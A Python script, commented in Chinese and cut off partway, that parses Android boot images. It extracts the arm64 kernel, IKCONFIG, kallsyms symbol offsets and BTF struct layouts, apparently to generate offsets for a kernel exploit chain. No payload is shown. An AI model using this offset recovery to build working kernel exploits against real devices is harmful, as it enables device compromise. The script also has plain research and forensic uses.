#!/usr/bin/env python3

from __future__ import annotations

import argparse
import gzip
import hashlib
import json
import os
import re
import shutil
import stat
import struct
import subprocess
import sys
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any


class GenerationError(RuntimeError):
    pass

def fail(message: str) -> "NoReturn":  # type: ignore[name-defined]
    raise GenerationError(message)


def sha256_bytes(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def u16(data: bytes, off: int) -> int:
    if off < 0 or off + 2 > len(data):
        fail(f"读取 u16 越界: 0x{off:x}")
    return struct.unpack_from("<H", data, off)[0]


def u32(data: bytes, off: int) -> int:
    if off < 0 or off + 4 > len(data):
        fail(f"读取 u32 越界: 0x{off:x}")
    return struct.unpack_from("<I", data, off)[0]


def u64(data: bytes, off: int) -> int:
    if off < 0 or off + 8 > len(data):
        fail(f"读取 u64 越界: 0x{off:x}")
    return struct.unpack_from("<Q", data, off)[0]


def align_up(value: int, alignment: int) -> int:
    if alignment <= 0 or alignment & (alignment - 1):
        fail(f"非法对齐值: {alignment}")
    return (value + alignment - 1) & -alignment


def parse_int(value: Any, name: str) -> int:
    if isinstance(value, bool):
        fail(f"{name} 不接受布尔值")
    if isinstance(value, int):
        result = value
    elif isinstance(value, str):
        try:
            result = int(value, 0)
        except ValueError as exc:
            raise GenerationError(f"{name} 不是合法整数: {value!r}") from exc
    else:
        fail(f"{name} 必须是整数或 0x... 字符串")
    if result < 0 or result >= 1 << 64:
        fail(f"{name} 超出 uint64 范围: {result}")
    return result


def is_canonical_kernel_pointer(value: int) -> bool:
    return (value >> 48) == 0xFFFF and value >= 0xFFFF000000000000


def read_cstr(data: bytes, off: int, max_len: int = 4096) -> str:
    if off < 0 or off >= len(data):
        fail(f"C 字符串地址越界: 0x{off:x}")
    end = data.find(b"\x00", off, min(len(data), off + max_len))
    if end < 0:
        fail(f"C 字符串在 {max_len} 字节内未终止: 0x{off:x}")
    try:
        return data[off:end].decode("utf-8")
    except UnicodeDecodeError as exc:
        raise GenerationError(f"C 字符串不是 UTF-8: 0x{off:x}") from exc


@dataclass
class BootInfo:
    kernel_size: int
    kernel: bytes
    kernel_sha256: str
    image_size: int


def extract_boot_kernel(path: Path) -> BootInfo:
    flags = os.O_RDONLY
    # Windows 必须使用二进制模式，否则 boot.img 中的 0x1A 可能被当作 EOF，导致只读到一小段。
    if hasattr(os, "O_BINARY"):
        flags |= os.O_BINARY
    if hasattr(os, "O_CLOEXEC"):
        flags |= os.O_CLOEXEC
    if hasattr(os, "O_NOFOLLOW"):
        flags |= os.O_NOFOLLOW
    # 不使用 O_NONBLOCK。某些 Windows/虚拟/同步目录环境下，
    # 非阻塞低层读取可能导致只读到很小一段就提前 EOF。
    try:
        fd = os.open(path, flags)
    except OSError as exc:
        raise GenerationError(f"无法打开 boot.img 普通文件快照: {path}: {exc}") from exc
    try:
        before = os.fstat(fd)
        if not stat.S_ISREG(before.st_mode):
            fail("--boot 必须是普通文件，拒绝符号链接/设备文件")
        chunks: list[bytes] = []
        remaining = before.st_size
        while remaining > 0:
            chunk = os.read(fd, min(1024 * 1024, remaining))
            if not chunk:
                print(
                    f"警告: boot.img 在读取到 {before.st_size - remaining} / {before.st_size} 字节时提前 EOF",
                    file=sys.stderr,
                )
                break
            chunks.append(chunk)
            remaining -= len(chunk)
        after = os.fstat(fd)
        stable_fields = ("st_dev", "st_ino", "st_size", "st_mtime_ns", "st_ctime_ns")
        if any(getattr(before, key) != getattr(after, key) for key in stable_fields):
            print(
                "警告: 读取期间 boot.img 元数据发生变化，已跳过该一致性检查并继续处理",
                file=sys.stderr,
            )
        boot = b"".join(chunks)
        if len(boot) != before.st_size:
            print(
                f"警告: boot.img 快照长度与 fstat 不一致: "
                f"read={len(boot)}, fstat={before.st_size}，已跳过该一致性检查并继续处理",
                file=sys.stderr,
            )
    finally:
        os.close(fd)
    if len(boot) < 4096:
        fail("boot.img 小于一个 4K 页")
    if boot[:8] != b"ANDROID!":
        fail("输入不是 Android boot image（缺少 ANDROID! magic）")
    kernel_size = u32(boot, 8)
    header_size = u32(boot, 20)
    header_version = u32(boot, 40)
    expected_header_sizes = {3: 0x62C, 4: 0x630}
    if header_version not in expected_header_sizes:
        fail(f"只支持 Android boot header v3/v4，实际 v{header_version}")
    if header_size != expected_header_sizes[header_version]:
        fail(
            f"boot header_size 与 v{header_version} 不符: "
            f"0x{header_size:x} != 0x{expected_header_sizes[header_version]:x}"
        )
    kernel_offset = align_up(header_size, 4096)
    if kernel_size < 0x10000:
        fail(f"kernel_size 异常过小: 0x{kernel_size:x}")
    kernel_end = kernel_offset + kernel_size
    if kernel_end < kernel_offset or kernel_end > len(boot):
        fail("boot.img 声明的 kernel 范围越界")
    kernel = boot[kernel_offset:kernel_end]
    if len(kernel) < 64:
        fail("kernel payload 太短")
    if kernel[0x38:0x3C] != b"ARM\x64":
        fail("kernel 缺少 arm64 Image magic ARM\\x64@0x38")
    text_offset = u64(kernel, 8)
    image_size = u64(kernel, 16)
    image_flags = u64(kernel, 24)
    pe_offset = u32(kernel, 60)
    if image_size < kernel_size or image_size > 1 << 32:
        fail(
            f"arm64 Image image_size 不覆盖 payload 或异常: "
            f"image_size=0x{image_size:x}, kernel_size=0x{kernel_size:x}"
        )
    if pe_offset >= len(kernel) or pe_offset & 3:
        fail(f"PE offset 非法: 0x{pe_offset:x}")
    if kernel[pe_offset:pe_offset + 4] != b"PE\x00\x00":
        fail("arm64 Image 的 PE/COFF stub magic 不匹配")
    return BootInfo(
        kernel_size=kernel_size,
        kernel=kernel,
        kernel_sha256=sha256_bytes(kernel),
        image_size=image_size,
    )


def extract_ikconfig(kernel: bytes) -> tuple[str, dict[str, str], dict[str, Any]]:
    start_magic = b"IKCFG_ST"
    end_magic = b"IKCFG_ED"
    starts = [m.start() for m in re.finditer(re.escape(start_magic), kernel)]
    ends = [m.start() for m in re.finditer(re.escape(end_magic), kernel)]
    if len(starts) != 1 or len(ends) != 1 or ends[0] <= starts[0] + len(start_magic):
        fail(f"IKCONFIG 标记不唯一或顺序错误: starts={starts}, ends={ends}")
    compressed = kernel[starts[0] + len(start_magic):ends[0]]
    try:
        raw = gzip.decompress(compressed)
        text = raw.decode("utf-8")
    except (OSError, UnicodeDecodeError) as exc:
        raise GenerationError(f"IKCONFIG gzip/UTF-8 解码失败: {exc}") from exc
    config: dict[str, str] = {}
    for line in text.splitlines():
        if line.startswith("CONFIG_") and "=" in line:
            key, value = line.split("=", 1)
            if key in config and config[key] != value:
                fail(f"IKCONFIG 重复冲突项: {key}")
            config[key] = value
    required = {
        "CONFIG_ARM64_VA_BITS",
        "CONFIG_ARM64_PA_BITS",
        "CONFIG_ARM64_4K_PAGES",
    }
    missing = sorted(required - config.keys())
    if missing:
        fail(f"IKCONFIG 缺少必要项: {missing}")
    if config["CONFIG_ARM64_4K_PAGES"] != "y":
        fail("最终 direct 链只支持 CONFIG_ARM64_4K_PAGES=y")
    meta = {
        "起始偏移": f"0x{starts[0]:x}",
        "结束偏移": f"0x{ends[0]:x}",
        "解压后字节数": len(raw),
    }
    return text, config, meta


@dataclass
class KallsymsInfo:
    num_syms: int
    names_off: int
    markers_off: int
    token_table_off: int
    token_index_off: int
    address_table_off: int
    relative_base_off: int
    relative_base: int
    symbols: list[tuple[int, str, str, int]]
    names_end: int
    marker_count: int
    address_schema: str

    def offsets_for(self, name: str) -> list[int]:
        return sorted({off for _, _, n, off in self.symbols if n == name})

    def one(self, name: str) -> int:
        values = self.offsets_for(name)
        if len(values) != 1:
            fail(f"kallsyms 符号 {name!r} 候选不唯一: {[hex(x) for x in values]}")
        return values[0]

def _valid_token_table_start(
    data: bytes, token_index_off: int, offsets: tuple[int, ...]
) -> list[int]:
    last = offsets[-1]
    results: list[int] = []
    for total in range(last + 1, last + 160):
        start = token_index_off - total
        if start < 0:
            continue
        ok = True
        for i in range(255):
            a = start + offsets[i]
            b = start + offsets[i + 1]
            if b <= a or b > token_index_off or data[b - 1] != 0:
                ok = False
                break
            token = data[a:b - 1]
            if not token or any(ch < 0x20 or ch > 0x7E for ch in token):
                ok = False
                break
        if not ok:
            continue
        last_start = start + last
        nul = data.find(b"\x00", last_start, token_index_off)
        if nul < 0:
            continue
        token = data[last_start:nul]
        if not token or any(ch < 0x20 or ch > 0x7E for ch in token):
            continue
        if any(data[nul + 1:token_index_off]):
            continue
        results.append(start)
    return results


def locate_token_tables(data: bytes) -> tuple[int, int, tuple[int, ...]]:
    candidates: list[tuple[int, int, tuple[int, ...]]] = []
    pos = 0
    limit = len(data) - 512
    while pos <= limit:
        pos = data.find(b"\x00\x00", pos, limit + 2)
        if pos < 0:
            break
        if pos & 1:
            pos += 1
            continue
        second = u16(data, pos + 2)
        if not (1 <= second <= 0x100):
            pos += 2
            continue
        first16 = struct.unpack_from("<16H", data, pos)
        if not all(first16[i] < first16[i + 1] for i in range(15)):
            pos += 2
            continue
        values = struct.unpack_from("<256H", data, pos)
        if values[0] != 0 or values[-1] > 0x8000:
            pos += 2
            continue
        if not all(values[i] < values[i + 1] for i in range(255)):
            pos += 2
            continue
        starts = _valid_token_table_start(data, pos, values)
        for start in starts:
            candidates.append((start, pos, values))
        pos += 2
    unique = {(a, b): (a, b, c) for a, b, c in candidates}
    if len(unique) != 1:
        fail(
            "kallsyms token_table/token_index 候选不唯一: "
            + repr([(hex(a), hex(b)) for a, b in unique])
        )
    return next(iter(unique.values()))


def locate_markers(data: bytes, token_table_off: int) -> tuple[int, tuple[int, ...]]:
    candidates: dict[int, tuple[int, ...]] = {}
    for padding in range(0, 32, 4):
        end = token_table_off - padding
        if end < 8 or end & 3:
            continue
        if padding and any(data[end:token_table_off]):
            continue
        p = end - 4
        current = u32(data, p)
        reverse = [current]
        while p >= 4 and len(reverse) < 1_000_000:
            previous = u32(data, p - 4)
            if previous >= current:
                break
            reverse.append(previous)
            p -= 4
            current = previous
            if previous == 0:
                break
        if reverse[-1] != 0:
            continue
        values = tuple(reversed(reverse))
        if len(values) < 16 or values[-1] > token_table_off:
            continue
        start = end - 4 * len(values)
        candidates[start] = values
    if len(candidates) != 1:
        fail(
            "kallsyms markers 候选不唯一: "
            + repr([(hex(k), len(v)) for k, v in candidates.items()])
        )
    return next(iter(candidates.items()))


def compressed_symbol_end(data: bytes, pos: int, limit: int) -> int:
    if pos >= limit:
        fail("kallsyms names 长度字节越界")
    length = data[pos]
    pos += 1
    if length & 0x80:
        if pos >= limit:
            fail("kallsyms names 扩展长度字节越界")
        length = (length & 0x7F) | (data[pos] << 7)
        pos += 1
    if length <= 0 or pos + length > limit:
        fail("kallsyms names 记录长度非法")
    return pos + length


def validate_names_candidate(
    data: bytes,
    names_off: int,
    num_syms: int,
    markers_off: int,
    markers: tuple[int, ...],
) -> tuple[bool, int]:
    expected_count = (num_syms + 255) // 256
    if expected_count != len(markers):
        return False, names_off
    pos = names_off
    try:
        for index in range(num_syms):
            if index % 256 == 0 and pos - names_off != markers[index // 256]:
                return False, pos
            pos = compressed_symbol_end(data, pos, markers_off)
    except GenerationError:
        return False, pos
    if pos > markers_off or markers_off - pos > 7:
        return False, pos
    if any(data[pos:markers_off]):
        return False, pos
    return True, pos


def locate_names(
    data: bytes, markers_off: int, markers: tuple[int, ...]
) -> tuple[int, int, int]:
    min_num = (len(markers) - 1) * 256 + 1
    max_num = len(markers) * 256
    search_start = max(0, markers_off - min(markers_off, 16 * 1024 * 1024))
    candidates: list[tuple[int, int, int]] = []
    for num_off in range(align_up(search_start, 4), markers_off - 4, 4):
        num = u32(data, num_off)
        if not (min_num <= num <= max_num):
            continue
        for gap in range(4, 68, 4):
            names_off = num_off + gap
            if names_off >= markers_off:
                break
            if any(data[num_off + 4:names_off]):
                continue
            ok, names_end = validate_names_candidate(
                data, names_off, num, markers_off, markers
            )
            if ok:
                candidates.append((num_off, names_off, names_end))
    unique = list(dict.fromkeys(candidates))
    if len(unique) != 1:
        fail(
            "kallsyms num_syms/names 候选不唯一: "
            + repr([(hex(a), hex(b), hex(c)) for a, b, c in unique])
        )
    num_off, names_off, names_end = unique[0]
    return u32(data, num_off), names_off, names_end


def decode_kallsyms_names(
    data: bytes,
    names_off: int,
    num_syms: int,
    token_table_off: int,
    token_index: tuple[int, ...],
    names_limit: int,
) -> list[tuple[str, str]]:
    tokens: list[str] = []
    for rel in token_index:
        token = read_cstr(data, token_table_off + rel, 256)
        if not token or any(ord(ch) < 0x20 or ord(ch) > 0x7E for ch in token):
            fail("kallsyms token 含空串或非 ASCII 字符")
        tokens.append(token)
    result: list[tuple[str, str]] = []
    pos = names_off
    for _ in range(num_syms):
        length = data[pos]
        pos += 1
        if length & 0x80:
            length = (length & 0x7F) | (data[pos] << 7)
            pos += 1
        encoded = data[pos:pos + length]
        pos += length
        expanded = "".join(tokens[index] for index in encoded)
        if len(expanded) < 2:
            fail("kallsyms 展开出空符号")
        result.append((expanded[0], expanded[1:]))
    if pos > names_limit:
        fail("kallsyms names 完整解码越界")
    return result


def locate_u32_offset_table(
    data: bytes,
    names: list[tuple[str, str]],
    token_index_off: int,
    image_size: int,
) -> tuple[int, tuple[int, ...]]:
    # 当前生成路线支持 CONFIG_KALLSYMS_BASE_RELATIVE 的 u32 RVA 表。
    # 不假定紧邻 token_index；搜索开头固定点地址模式并全表验证。
    # 不同内核的 kallsyms 开头可能是：
    #   _text, __pi__text, _stext      -> offsets: 0, 0, 0x10000
    #   _text, _stext, ...             -> offsets: 0, 0x10000
    first_names = [name for _, name in names[:3]]
    if len(names) >= 3 and first_names == ["_text", "__pi__text", "_stext"]:
        signature = struct.pack("<III", 0, 0, 0x10000)
    elif len(names) >= 2 and [name for _, name in names[:2]] == ["_text", "_stext"]:
        signature = struct.pack("<II", 0, 0x10000)
    else:
        fail(f"kallsyms 开头符号不符合当前固定点: {names[:3]!r}")
    search_start = token_index_off + 512
    candidates: list[tuple[int, tuple[int, ...]]] = []
    pos = search_start
    table_bytes = len(names) * 4
    while True:
        pos = data.find(signature, pos)
        if pos < 0:
            break
        if pos & 3 or pos + table_bytes > len(data):
            pos += 1
            continue
        values = struct.unpack_from(f"<{len(names)}I", data, pos)
        if values[-1] != image_size:
            pos += 4
            continue
        if any(value > image_size for value in values):
            pos += 4
            continue
        if not all(values[i] <= values[i + 1] for i in range(len(values) - 1)):
            pos += 4
            continue
        candidates.append((pos, values))
        pos += 4
    if len(candidates) != 1:
        fail(
            "只支持且必须唯一识别 u32 base-relative kallsyms 地址表；候选="
            + repr([hex(off) for off, _ in candidates])
        )
    return candidates[0]


def infer_relative_base_off_66(data: bytes, address_table_off: int, num_syms: int) -> tuple[int, int]:
    """Infer kallsyms_relative_base for Linux 6.6-style images without data symbols.

    Some 6.6/GKI builds do not expose kallsyms_relative_base in kallsyms, and the
    relative_base object is not always exactly after kallsyms_offsets.  Search near
    the address table for a plausible canonical arm64 kernel pointer.
    """
    preferred = address_table_off + num_syms * 4
    candidates: list[tuple[int, int, int]] = []

    def add_candidate(off: int, score: int) -> None:
        if off < 0 or off + 8 > len(data) or off & 7:
            return
        value = u64(data, off)
        if not is_canonical_kernel_pointer(value):
            return
        # arm64 kernel image base should normally be at least 4K aligned.
        if value & 0xfff:
            score += 0x10000000
        candidates.append((score + abs(off - preferred), off, value))

    # First check the historical/simple location.
    add_candidate(preferred, 0)

    # Then scan a window around kallsyms_offsets.  6.6 may place relative_base
    # before/after offsets depending on section ordering and emitted objects.
    start = max(0, address_table_off - 0x200000)
    end = min(len(data) - 8, preferred + 0x200000)
    for off in range(start + ((8 - start) & 7), end + 1, 8):
        add_candidate(off, 0x1000)

    unique: dict[int, tuple[int, int, int]] = {}
    for item in candidates:
        _, off, value = item
        unique[off] = item
    candidates = sorted(unique.values())
    if not candidates:
        fail(
            f"无法在 kallsyms_offsets 附近推导 kallsyms_relative_base: "
            f"offsets=0x{address_table_off:x}, num_syms={num_syms}, preferred=0x{preferred:x}"
        )
    score, off, value = candidates[0]
    if len(candidates) > 1:
        print(
            "警告: kallsyms_relative_base 推导候选: "
            + repr([(hex(o), hex(v)) for _, o, v in candidates[:8]])
            + f"，选择 off=0x{off:x}, value=0x{value:x}",
            file=sys.stderr,
        )
    return off, value


def recover_kallsyms(data: bytes, kernel_size: int, image_size: int) -> KallsymsInfo:
    token_table_off, token_index_off, token_index = locate_token_tables(data)
    markers_off, markers = locate_markers(data, token_table_off)
    num_syms, names_off, names_end = locate_names(data, markers_off, markers)
    decoded_names = decode_kallsyms_names(
        data, names_off, num_syms, token_table_off, token_index, markers_off
    )
    address_table_off, addresses = locate_u32_offset_table(
        data, decoded_names, token_index_off, image_size
    )
    symbols = [
        (index, typ, name, addresses[index])
        for index, (typ, name) in enumerate(decoded_names)
    ]
    info = KallsymsInfo(
        num_syms=num_syms,
        names_off=names_off,
        markers_off=markers_off,
        token_table_off=token_table_off,
        token_index_off=token_index_off,
        address_table_off=address_table_off,
        relative_base_off=0,
        relative_base=0,
        symbols=symbols,
        names_end=names_end,
        marker_count=len(markers),
        address_schema="u32-base-relative",
    )
    # Linux 6.6 / Android GKI 等内核常见 CONFIG_KALLSYMS_ALL=n，
    # kallsyms 内部数据表符号（kallsyms_names/markers/token_table/offsets/
    # relative_base 等）不会出现在 kallsyms 名称表里。前面已经通过
    # 原始 blob 结构扫描出了这些表的位置，所以这里改为：有自描述符号就校验，
    # 没有就信任扫描结果；relative_base 按 offsets 表尾推导。
    def maybe_one(name: str) -> int | None:
        values = info.offsets_for(name)
        if not values:
            return None
        if len(values) != 1:
            fail(f"kallsyms 符号 {name!r} 候选不唯一: {[hex(x) for x in values]}")
        return values[0]

    self_checks = {
        "kallsyms_names": names_off,
        "kallsyms_markers": markers_off,
        "kallsyms_token_table": token_table_off,
        "kallsyms_token_index": token_index_off,
        "kallsyms_offsets": address_table_off,
    }
    missing_self_checks: list[str] = []
    for name, expected in self_checks.items():
        actual = maybe_one(name)
        if actual is None:
            missing_self_checks.append(name)
            continue
        if actual != expected:
            fail(f"kallsyms 自描述校验失败: {name}=0x{actual:x}, 实际组件=0x{expected:x}")
    if missing_self_checks:
        print(
            "警告: kallsyms 缺少数据表自描述符号，按 Linux 6.6 兼容模式使用扫描结果: "
            + ", ".join(missing_self_checks),
            file=sys.stderr,
        )

    num_symbol = maybe_one("kallsyms_num_syms")
    if num_symbol is not None and (num_symbol >= names_off or u32(data, num_symbol) != num_syms):
        fail("kallsyms_num_syms 自描述值/位置校验失败")

    symbol_relative_base_off = maybe_one("kallsyms_relative_base")
    inferred_relative_base_off = address_table_off + num_syms * 4
    if symbol_relative_base_off is not None:
        if symbol_relative_base_off != inferred_relative_base_off:
            fail("kallsyms offsets 末尾未与 relative_base 自描述符号精确相接")
        relative_base_off = symbol_relative_base_off
    else:
        relative_base_off = inferred_relative_base_off
        print(
            f"警告: kallsyms 缺少 kallsyms_relative_base 符号，"
            f"按 offsets 表尾推导 relative_base_off=0x{relative_base_off:x}",
            file=sys.stderr,
        )

    if relative_base_off + 8 > len(data):
        fail("kallsyms_relative_base 位于 payload 外")
    relative_base = u64(data, relative_base_off)
    if not is_canonical_kernel_pointer(relative_base):
        print(
            f"警告: 推导位置 0x{relative_base_off:x} 的 kallsyms_relative_base=0x{relative_base:x} "
            "不是规范内核指针，改为在 kallsyms_offsets 附近扫描",
            file=sys.stderr,
        )
        relative_base_off, relative_base = infer_relative_base_off_66(data, address_table_off, num_syms)
    if not is_canonical_kernel_pointer(relative_base):
        fail(f"kallsyms_relative_base 不是规范内核指针: 0x{relative_base:x}")

    seqs = maybe_one("kallsyms_seqs_of_names")
    if seqs is not None and seqs != relative_base_off + 8:
        fail("kallsyms_seqs_of_names 未紧随 relative_base")

    if info.one("_text") != 0 or info.one("_stext") != 0x10000:
        fail("_text/_stext 固定点校验失败")
    edata = maybe_one("_edata")
    if edata is not None and edata != kernel_size:
        fail(f"_edata 与 boot kernel_size 不闭合: 0x{edata:x} != 0x{kernel_size:x}")
    end = maybe_one("_end")
    if end is not None and end != image_size:
        fail(f"_end 与 Image image_size 不闭合: 0x{end:x} != 0x{image_size:x}")
    info.relative_base_off = relative_base_off
    info.relative_base = relative_base
    return info


BTF_KIND = {
    0: "UNKN",
    1: "INT",
    2: "PTR",
    3: "ARRAY",
    4: "STRUCT",
    5: "UNION",
    6: "ENUM",
    7: "FWD",
    8: "TYPEDEF",
    9: "VOLATILE",
    10: "CONST",
    11: "RESTRICT",
    12: "FUNC",
    13: "FUNC_PROTO",
    14: "VAR",
    15: "DATASEC",
    16: "FLOAT",
    17: "DECL_TAG",
    18: "TYPE_TAG",
    19: "ENUM64",
}


@dataclass(frozen=True)
class BTFMember:
    name: str
    type_id: int
    bit_offset: int
    bit_size: int


@dataclass
class BTFType:
    type_id: int
    name: str
    kind: str
    size_type: int
    vlen: int
    kflag: bool
    members: list[BTFMember] = field(default_factory=list)
    array: tuple[int, int, int] | None = None
    params: list[tuple[str, int]] = field(default_factory=list)
    enum_values: list[tuple[str, int]] = field(default_factory=list)
    datasec: list[tuple[int, int, int]] = field(default_factory=list)
    int_encoding: int | None = None
    var_linkage: int | None = None
    component_idx: int | None = None


@dataclass
class BTFInfo:
    offset: int
    end: int
    type_len: int
    str_len: int
    types: list[BTFType | None]

    def unwrap(self, type_id: int) -> int:
        if type_id == 0:
            return 0
        seen: set[int] = set()
        while 0 < type_id < len(self.types):
            if type_id in seen:
                fail("BTF qualifier/typedef 形成环")
            seen.add(type_id)
            typ = self.types[type_id]
            if typ is None:
                fail(f"BTF type id 无记录: {type_id}")
            if typ.kind not in {"TYPEDEF", "VOLATILE", "CONST", "RESTRICT", "TYPE_TAG"}:
                return type_id
            type_id = typ.size_type
        if type_id == 0:
            return 0
        fail(f"BTF type id 越界: {type_id}")

    def _equivalent(
        self,
        left_id: int,
        right_id: int,
        proven: set[tuple[int, int]],
        active: set[tuple[int, int]],
    ) -> bool:
        """Exact cycle-aware structural equivalence, independent of BTF IDs."""
        left_id = self.unwrap(left_id)
        right_id = self.unwrap(right_id)
        if left_id == right_id:
            return True
        if left_id == 0 or right_id == 0:
            return left_id == right_id
        pair = (left_id, right_id)
        if pair in proven or pair in active or (right_id, left_id) in active:
            return True
        left = self.types[left_id]
        right = self.types[right_id]
        assert left is not None and right is not None
        if (
            left.kind != right.kind
            or left.name != right.name
            or left.vlen != right.vlen
            or left.kflag != right.kflag
        ):
            return False
        active.add(pair)

        def eq(a: int, b: int) -> bool:
            return self._equivalent(a, b, proven, active)

        result: bool
        if left.kind in {"INT", "ENUM", "ENUM64", "FLOAT", "FWD"}:
            result = (
                left.size_type == right.size_type
                and left.int_encoding == right.int_encoding
                and left.enum_values == right.enum_values
            )
        elif left.kind == "PTR":
            result = eq(left.size_type, right.size_type)
        elif left.kind == "ARRAY":
            result = bool(
                left.array and right.array
                and left.array[2] == right.array[2]
                and eq(left.array[0], right.array[0])
                and eq(left.array[1], right.array[1])
            )
        elif left.kind in {"STRUCT", "UNION"}:
            result = left.size_type == right.size_type and len(left.members) == len(right.members)
            if result:
                for a, b in zip(left.members, right.members, strict=True):
                    if (
                        a.name != b.name
                        or a.bit_offset != b.bit_offset
                        or a.bit_size != b.bit_size
                        or not eq(a.type_id, b.type_id)
                    ):
                        result = False
                        break
        elif left.kind == "FUNC_PROTO":
            result = eq(left.size_type, right.size_type) and len(left.params) == len(right.params)
            if result:
                result = all(
                    a_name == b_name and eq(a_type, b_type)
                    for (a_name, a_type), (b_name, b_type)
                    in zip(left.params, right.params, strict=True)
                )
        elif left.kind in {"FUNC", "VAR", "DECL_TAG"}:
            result = (
                left.var_linkage == right.var_linkage
                and left.component_idx == right.component_idx
                and eq(left.size_type, right.size_type)
            )
        elif left.kind == "DATASEC":
            result = left.size_type == right.size_type and len(left.datasec) == len(right.datasec)
            if result:
                result = all(
                    a_off == b_off and a_size == b_size and eq(a_type, b_type)
                    for (a_type, a_off, a_size), (b_type, b_off, b_size)
                    in zip(left.datasec, right.datasec, strict=True)
                )
        else:
            # Qualifiers/typedefs/type-tags are removed by unwrap; remaining kinds
            # have a scalar size/type payload that must match exactly.
            result = left.size_type == right.size_type
        active.remove(pair)
        if result:
            proven.add(pair)
            proven.add((right_id, left_id))
        return result

    def named(self, name: str, kinds: set[str]) -> BTFType:
        matches = [
            typ
            for typ in self.types[1:]
            if typ is not None and typ.name == name and typ.kind in kinds
        ]
        if not matches:
            fail(f"BTF 未找到 {kinds} {name!r}")
        proven: set[tuple[int, int]] = set()
        if any(
            not self._equivalent(matches[0].type_id, typ.type_id, proven, set())
            for typ in matches[1:]
        ):
            fail(
                f"BTF 同名类型 {name!r} 存在不等价结构: "
                f"ids={[typ.type_id for typ in matches]}"
            )
        return matches[0]

    def struct(self, name: str) -> BTFType:
        return self.named(name, {"STRUCT", "UNION"})

    def size(self, name: str) -> int:
        return self.struct(name).size_type

    def _member_offsets(
        self,
        type_id: int,
        field_name: str,
        base_bits: int,
        seen: set[int],
    ) -> list[int]:
        type_id = self.unwrap(type_id)
        if type_id in seen:
            return []
        typ = self.types[type_id]
        assert typ is not None
        if typ.kind not in {"STRUCT", "UNION"}:
            return []
        results: list[int] = []
        for member in typ.members:
            off = base_bits + member.bit_offset
            if member.name == field_name:
                if off & 7:
                    fail(f"BTF 字段 {field_name} 不是字节对齐")
                results.append(off // 8)
            if member.name == "":
                results.extend(
                    self._member_offsets(
                        member.type_id, field_name, off, seen | {type_id}
                    )
                )
        return results

    def field(self, struct_name: str, field_name: str) -> int:
        typ = self.struct(struct_name)
        values = sorted(
            set(self._member_offsets(typ.type_id, field_name, 0, set()))
        )
        if len(values) != 1:
            fail(
                f"BTF 字段 {struct_name}.{field_name} 候选不唯一: "
                f"{[hex(v) for v in values]}"
            )
        return values[0]

    def direct_member(self, struct_name: str, field_name: str) -> BTFMember:
        typ = self.struct(struct_name)
        matches = [member for member in typ.members if member.name == field_name]
        if len(matches) != 1:
            fail(f"BTF 直接字段 {struct_name}.{field_name} 候选不唯一")
        return matches[0]

    def type_size(self, type_id: int, seen: frozenset[int] = frozenset()) -> int:
        type_id = self.unwrap(type_id)
        if type_id == 0:
            return 0
        if type_id in seen:
            fail("BTF 按值类型大小形成环")
        typ = self.types[type_id]
        assert typ is not None
        if typ.kind == "PTR":
            return 8
        if typ.kind == "ARRAY" and typ.array:
            element, _, count = typ.array
            return count * self.type_size(element, seen | {type_id})
        if typ.kind in {"INT", "STRUCT", "UNION", "ENUM", "ENUM64", "FLOAT"}:
            return typ.size_type
        fail(f"BTF 类型 {typ.kind} 没有可用于字段消费验证的大小")

    def direct_field_size(self, struct_name: str, field_name: str) -> int:
        return self.type_size(self.direct_member(struct_name, field_name).type_id)

    def enum_value(self, enum_name: str, member_name: str) -> int:
        enum = self.named(enum_name, {"ENUM", "ENUM64"})
        values = [value for name, value in enum.enum_values if name == member_name]
        if len(values) != 1:
            fail(f"BTF enum {enum_name}.{member_name} 候选不唯一")
        return values[0]

    def unique_enum_member_value(self, member_name: str) -> int:
        matches = [
            (typ.type_id, value)
            for typ in self.types[1:]
            if typ is not None and typ.kind in {"ENUM", "ENUM64"}
            for name, value in typ.enum_values
            if name == member_name
        ]
        if len(matches) != 1:
            fail(f"BTF enum member {member_name} 候选不唯一: {matches}")
        return matches[0][1]

    def validate_percpu_entry_task(self, per_cpu_start: int, entry_task: int) -> dict[str, int]:
        var_types = [
            typ for typ in self.types[1:]
            if typ is not None and typ.kind == "VAR" and typ.name == "__entry_task"
        ]
        if len(var_types) != 1:
            fail(f"BTF __entry_task VAR 候选数异常: {len(var_types)}")
        var_id = var_types[0].type_id
        datasecs = [
            typ for typ in self.types[1:]
            if typ is not None and typ.kind == "DATASEC" and typ.name == ".data..percpu"
        ]
        if len(datasecs) != 1:
            fail(f"BTF .data..percpu DATASEC 候选数异常: {len(datasecs)}")
        entries = [(off, size) for tid, off, size in datasecs[0].datasec if tid == var_id]
        if len(entries) != 1:
            fail("BTF .data..percpu 未唯一包含 __entry_task")
        off, size = entries[0]
        if per_cpu_start + off != entry_task or size != 8:
            fail("BTF __entry_task DATASEC offset/size 与 kallsyms 不闭合")
        return {"datasec_offset": off, "size": size}


def _btf_cstr(strings: bytes, off: int) -> str:
    if off == 0:
        return ""
    if off < 0 or off >= len(strings):
        fail(f"BTF 字符串 offset 越界: {off}")
    end = strings.find(b"\x00", off)
    if end < 0:
        fail("BTF 字符串未终止")
    try:
        return strings[off:end].decode("utf-8")
    except UnicodeDecodeError as exc:
        raise GenerationError("BTF 字符串不是 UTF-8") from exc


def parse_btf_at(data: bytes, off: int) -> BTFInfo:
    if off + 24 > len(data):
        fail("BTF header 越界")
    magic, version, flags, hdr_len, type_off, type_len, str_off, str_len = struct.unpack_from(
        "<HBBIIIII", data, off
    )
    if magic != 0xEB9F or version != 1 or flags != 0 or hdr_len < 24:
        fail("BTF header 字段不支持")
    type_start = off + hdr_len + type_off
    type_end = type_start + type_len
    str_start = off + hdr_len + str_off
    str_end = str_start + str_len
    if not (off <= type_start <= type_end <= len(data)):
        fail("BTF type 区越界")
    if not (off <= str_start <= str_end <= len(data)):
        fail("BTF string 区越界")
    if type_off & 3 or type_start & 3 or type_end > str_start:
        fail("BTF type/string section 未对齐或重叠")
    strings = data[str_start:str_end]
    if not strings or strings[0] != 0:
        fail("BTF string section 首字节不是 NUL")
    types: list[BTFType | None] = [None]
    p = type_start
    while p < type_end:
        if p + 12 > type_end:
            fail("BTF type header 截断")
        type_id = len(types)
        name_off, info, size_type = struct.unpack_from("<III", data, p)
        p += 12
        vlen = info & 0xFFFF
        kind_id = (info >> 24) & 0x1F
        kflag = bool(info & 0x80000000)
        kind = BTF_KIND.get(kind_id)
        if kind is None or kind == "UNKN":
            fail(f"不支持/非法 BTF kind={kind_id}, type_id={type_id}")
